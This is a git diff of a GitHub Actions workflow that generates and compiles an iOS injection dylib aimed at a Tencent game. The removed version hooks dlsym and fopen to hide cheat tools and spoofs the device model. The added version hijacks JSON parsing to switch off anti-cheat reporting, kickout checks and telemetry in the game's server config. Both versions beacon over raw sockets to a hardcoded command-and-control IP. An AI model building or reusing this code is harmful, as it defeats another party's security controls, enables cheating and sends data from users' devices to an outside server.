@@ -1,4 +1,4 @@
-name: Imperial V-MAX - Truth Radar & Spoofer
+name: Imperial V-MAX - Config Hijacker & Radar
 
 on:
   push:
@@ -6,156 +6,149 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_truth_radar:
-    name: Compile Truth Radar Dylib
+  build_json_hijacker_radar:
+    name: Compile JSON Hijacker with Radar
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Fetch Fishhook
+      - name: Generate Obj-C Payload (Main.mm)
         run: |
           mkdir -p jni
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
-
-      - name: Generate Radar Payload (Main.mm)
-        run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
-          #import <UIKit/UIKit.h>
           #import <objc/runtime.h>
-          #import <dlfcn.h>
           #import <sys/socket.h>
           #import <arpa/inet.h>
-          #include "fishhook.h"
-
-          // ⚠️ رابط سيرفر مسعود
-          #define RADAR_IP "44.192.33.117"
-          #define RADAR_PORT 8080
+          #import <unistd.h>
 
           /**
            * ========================================================
-           * 🛡️ MASOUD TRUTH RADAR (NETWORK MONITOR + HEAVY SPOOF)
+           * 🛡️ MASOUD CONFIG HIJACKER + RADAR (NO-JB SAFE)
+           * 🎯 يخترق أوامر Tencent ويرسل تقارير حية للرادار
            * ========================================================
            */
-           
-          static NSMutableSet* g_reported_logs = nil;
 
-          // 📡 الإرسال للسيرفر (الترمنال)
-          void SendToRadar(NSString *type, NSString *target) {
+          // ⚠️ رابط سيرفر مسعود
+          #define C2_IP "44.192.33.117"
+          #define C2_PORT 8080
+
+          // 📡 إرسال البيانات للترمنال
+          void SendToRadar(NSString *funcName, NSString *targetInfo) {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                  NSString* uniqueKey = [NSString stringWithFormat:@"%@_%@", type, target];
-                  @synchronized(g_reported_logs) {
-                      if ([g_reported_logs containsObject:uniqueKey]) return;
-                      [g_reported_logs addObject:uniqueKey];
-                  }
-
-                  NSDictionary *payload = @{ @"func": type, @"target": target, @"caller": @"System_Radar" };
-                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
-                  if (!jsonData) return;
+                  NSDictionary *data = @{
+                      @"func": funcName,
+                      @"target": targetInfo,
+                      @"caller": @"JSON_Hijacker",
+                      @"threat": @"INFO"
+                  };
+                  NSData *json = [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
+                  if (!json) return;
                   
                   int sock = socket(AF_INET, SOCK_STREAM, 0);
                   if (sock < 0) return;
+                  
                   struct sockaddr_in srv;
-                  srv.sin_family = AF_INET; srv.sin_port = htons(RADAR_PORT);
-                  inet_pton(AF_INET, RADAR_IP, &srv.sin_addr);
-                  struct timeval tv = {1, 0}; setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-                  if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) send(sock, [jsonData bytes], [jsonData length], 0);
+                  srv.sin_family = AF_INET; 
+                  srv.sin_port = htons(C2_PORT);
+                  inet_pton(AF_INET, C2_IP, &srv.sin_addr);
+                  
+                  struct timeval tv = {1, 0}; 
+                  setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+                  
+                  if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) {
+                      send(sock, [json bytes], [json length], 0);
+                  }
                   close(sock);
               });
           }
 
-          // ==========================================
-          // 🎭 التمويه العميق (Spoofing)
-          // ==========================================
-          void SafeSwizzle(Class c, SEL orig, IMP newImp, IMP* oldImp) {
-              Method m = class_getInstanceMethod(c, orig);
-              if (!m) m = class_getClassMethod(c, orig);
-              if (m) { *oldImp = method_getImplementation(m); method_setImplementation(m, newImp); }
-          }
+          // حفظ الدالة الأصلية لقراءة الـ JSON
+          static id (*orig_JSONObjectWithData)(Class, SEL, NSData *, NSJSONReadingOptions, NSError **);
 
-          // تزييف روابط الإنترنت (مراقبة ما يرسله الجاسوس للسيرفر)
-          typedef id (*URLWithString_t)(id, SEL, NSString *);
-          static URLWithString_t orig_URLWithString;
-          id hk_URLWithString(id self, SEL _cmd, NSString *urlStr) {
-              if (urlStr && [urlStr isKindOfClass:[NSString class]]) {
-                  // إذا كان الرابط يخص حماية اللعبة، نرسله للترمنال فوراً!
-                  if ([urlStr containsString:@"tencent"] || [urlStr containsString:@"tdatamaster"] || [urlStr containsString:@"crashsight"]) {
-                      SendToRadar(@"NETWORK_URL", urlStr);
-                  }
-              }
-              return orig_URLWithString(self, _cmd, urlStr);
-          }
+          // 🔄 الدالة المخترقة (تعترض الملفات وتعدلها)
+          id hk_JSONObjectWithData(Class self, SEL _cmd, NSData *data, NSJSONReadingOptions opt, NSError **err) {
+              id result = orig_JSONObjectWithData(self, _cmd, data, opt, err);
 
-          // ==========================================
-          // 👁️ خطافات المراقبة (C-Hooks)
-          // ==========================================
-          static void* (*orig_dlsym)(void* handle, const char* symbol);
-          static FILE* (*orig_fopen)(const char *filename, const char *mode);
+              if ([result isKindOfClass:[NSDictionary class]]) {
+                  NSDictionary *dict = (NSDictionary *)result;
 
-          void* hk_dlsym(void* handle, const char* symbol) {
-              if (symbol) {
-                  NSString *symStr = [NSString stringWithUTF8String:symbol];
-                  NSArray *cheats = @[@"ptrace", @"MSHook", @"Substrate", @"fishhook", @"Cydia"];
-                  for (NSString *cheat in cheats) {
-                      if ([symStr containsString:cheat]) {
-                          SendToRadar(@"BLOCKED_DLSYM", symStr);
-                          return NULL; // تمويه: نعمي الجاسوس عن الهاك
+                  // 3. نفحص: هل هذا هو ملف getconfig؟
+                  if (dict[@"biz_data"] && dict[@"biz_data"][@"merged_cfg"]) {
+                      
+                      NSMutableDictionary *mDict = [dict mutableCopy];
+                      NSMutableDictionary *bizData = [mDict[@"biz_data"] mutableCopy];
+                      NSMutableDictionary *mergedCfg = [bizData[@"merged_cfg"] mutableCopy];
+
+                      for (NSString *key in [mergedCfg allKeys]) {
+                          id innerVal = mergedCfg[key];
+                          if ([innerVal isKindOfClass:[NSDictionary class]]) {
+                              NSMutableDictionary *innerDict = [innerVal mutableCopy];
+
+                              // 🔥 تدمير أوامر التجسس والمراقبة!
+                              if (innerDict[@"GEnableUploadStatInfo"]) innerDict[@"GEnableUploadStatInfo"] = @"false";
+                              if (innerDict[@"XPCallReportCrashKitBattle"]) innerDict[@"XPCallReportCrashKitBattle"] = @"false";
+                              if (innerDict[@"XPCallReportCrashKitBattleTrace"]) innerDict[@"XPCallReportCrashKitBattleTrace"] = @"false";
+                              if (innerDict[@"USFSKickoutPkgName"]) innerDict[@"USFSKickoutPkgName"] = @"";
+                              if (innerDict[@"USFSKickoutPkgName_1"]) innerDict[@"USFSKickoutPkgName_1"] = @"";
+                              if (innerDict[@"EnableClientInGameReplay"]) innerDict[@"EnableClientInGameReplay"] = @"0";
+
+                              mergedCfg[key] = innerDict;
+                          }
                       }
-                  }
-              }
-              return orig_dlsym(handle, symbol);
-          }
 
-          FILE* hk_fopen(const char *filename, const char *mode) {
-              if (filename) {
-                  NSString *fileStr = [NSString stringWithUTF8String:filename];
-                  if ([fileStr containsString:@"Cydia"] || [fileStr containsString:@"TDM_KV"] || [fileStr containsString:@"Masoud"]) {
-                      SendToRadar(@"BLOCKED_FILE", fileStr);
-                      return NULL; // تمويه: نمنع قراءة الملفات المشبوهة
+                      // تدمير نظام (GEM) لمراقبة المعالج
+                      if (mDict[@"GEM"]) {
+                          NSMutableDictionary *gemDict = [mDict[@"GEM"] mutableCopy];
+                          gemDict[@"cpu"] = @"0";
+                          gemDict[@"battery"] = @"0";
+                          gemDict[@"netflow"] = @"0";
+                          gemDict[@"ping"] = @"0";
+                          mDict[@"GEM"] = gemDict;
+                      }
+
+                      bizData[@"merged_cfg"] = mergedCfg;
+                      mDict[@"biz_data"] = bizData;
+
+                      // 📡 إرسال إشعار للترمنال بنجاح الاختراق
+                      SendToRadar(@"GETCONFIG_HIJACKED", @"Tencent Orders Neutralized Successfully! 💀");
+                      NSLog(@"[MASOUD LAB] 🎯 GETCONFIG HIJACKED!");
+                      
+                      return [mDict copy];
                   }
               }
-              return orig_fopen(filename, mode);
+              return result;
           }
 
           // ==========================================
           // 🚀 التشغيل
           // ==========================================
           __attribute__((constructor))
-          static void deploy_truth_radar() {
-              g_reported_logs = [[NSMutableSet alloc] init];
+          static void start_json_hijacker() {
+              // الحقن السلس بدون أي Fishhook
+              Method m = class_getClassMethod([NSJSONSerialization class], @selector(JSONObjectWithData:options:error:));
+              orig_JSONObjectWithData = (id (*)(Class, SEL, NSData *, NSJSONReadingOptions, NSError **))method_getImplementation(m);
+              method_setImplementation(m, (IMP)hk_JSONObjectWithData);
               
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  
-                  // تفعيل التمويه وتزييف الهوية
-                  SafeSwizzle([NSURL class], @selector(URLWithString:), (IMP)hk_URLWithString, (IMP*)&orig_URLWithString);
-                  method_setImplementation(class_getInstanceMethod([UIDevice class], @selector(model)), imp_implementationWithBlock(^NSString* (id self) { return @"iPad"; }));
-                  
-                  // تفعيل خطافات المراقبة
-                  struct rebinding rebinds[] = {
-                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym},
-                      {"fopen", (void *)hk_fopen, (void **)&orig_fopen}
-                  };
-                  rebind_symbols(rebinds, 2);
-
-                  SendToRadar(@"SYSTEM_INIT", @"Truth Radar & Spoofer Active!");
-                  NSLog(@"[MASOUD LAB] 🦅 Truth Radar Deployed.");
-              });
+              // 📡 إرسال إشارة الحياة للترمنال
+              SendToRadar(@"SYSTEM_INIT", @"JSON Hijacker + Radar is ACTIVE 🦅");
+              NSLog(@"[MASOUD LAB] 🦅 CONFIG HIJACKER ACTIVE!");
           }
           EOF
 
-      - name: Compile Truth Radar
+      - name: Compile JSON Hijacker Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.c -o Masoud-Truth-Radar.dylib \
-          -framework Foundation -framework UIKit -lobjc
-          strip -x Masoud-Truth-Radar.dylib
+          jni/main.mm -o Masoud-Hijacker-Radar.dylib \
+          -framework Foundation -lobjc
+          
+          strip -x Masoud-Hijacker-Radar.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-Truth-Radar
-          path: Masoud-Truth-Radar.dylib
+          name: Masoud-Hijacker-Radar
+          path: Masoud-Hijacker-Radar.dylib
